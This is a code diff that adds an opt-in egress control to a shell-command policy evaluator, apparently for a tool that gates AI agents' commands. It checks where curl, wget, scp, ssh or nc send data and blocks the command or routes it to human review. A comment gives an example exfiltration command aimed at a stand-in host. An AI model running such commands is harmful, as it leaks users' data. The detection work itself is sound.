@@ -13,11 +13,13 @@ import {
   analyzeFsOperation,
   isBashTool,
   AST_FS_REGEX_RULES,
+  extractShellDestinations,
   type ShellCommandAnalysis,
 } from '../shell';
 import { matchesPattern, evaluateSmartConditions, getNestedValue } from '../rules';
 import { analyzePipeChain } from './pipe-chain';
 import { extractAllSshHosts } from './ssh-parser';
+import { evaluateEgress, type EgressPolicy } from '../egress';
 
 // ── Public types ──────────────────────────────────────────────────────────────
 
@@ -29,6 +31,9 @@ export interface PolicyConfig {
     toolInspection: Record<string, string>;
     smartRules: SmartRule[];
     dlp: { enabled: boolean; scanIgnoredTools: boolean };
+    /** Egress / destination control (GAP-5). Optional for back-compat with
+     *  callers/tests that build a PolicyConfig without it. */
+    egress?: EgressPolicy;
   };
   settings: {
     mode: string;
@@ -349,6 +354,30 @@ export async function evaluatePolicy(
     // non-pipe input.
     const ptVerdict = pipeChainVerdict(shellCommand, isTrustedHost);
     if (ptVerdict) return ptVerdict;
+
+    // ── Egress / destination control (GAP-5) ────────────────────────────────
+    // Gate WHERE network tools send data (curl/wget/scp/ssh/nc) against the
+    // egress allow/deny policy. Opt-in (egress.enabled). Catches exfil to an
+    // untrusted host even when the payload is dynamic (curl evil.com -d "$(…)")
+    // — the destination is literal in the command. 'review' routes to the human
+    // via the normal policyResult path (ruleName set ⇒ reliable human review).
+    if (config.policy.egress?.enabled) {
+      const dests = extractShellDestinations(shellCommand);
+      if (dests.length > 0) {
+        const eg = evaluateEgress(dests, config.policy.egress);
+        if (eg) {
+          return {
+            decision: eg.verdict,
+            blockedByLabel:
+              eg.verdict === 'block' ? '🌐 Node9 Egress (Blocked)' : '🌐 Node9 Egress (Review)',
+            reason: eg.reason,
+            ruleName: `egress:${eg.binary}:${eg.host}`,
+            ruleDescription: eg.reason,
+            tier: eg.verdict === 'block' ? 3 : 4,
+          };
+        }
+      }
+    }
 
     // ── SSH multi-hop host extraction ─────────────────────────────────────────
     // Runs only for ssh/scp/rsync to extract all involved hosts (including jump hosts).
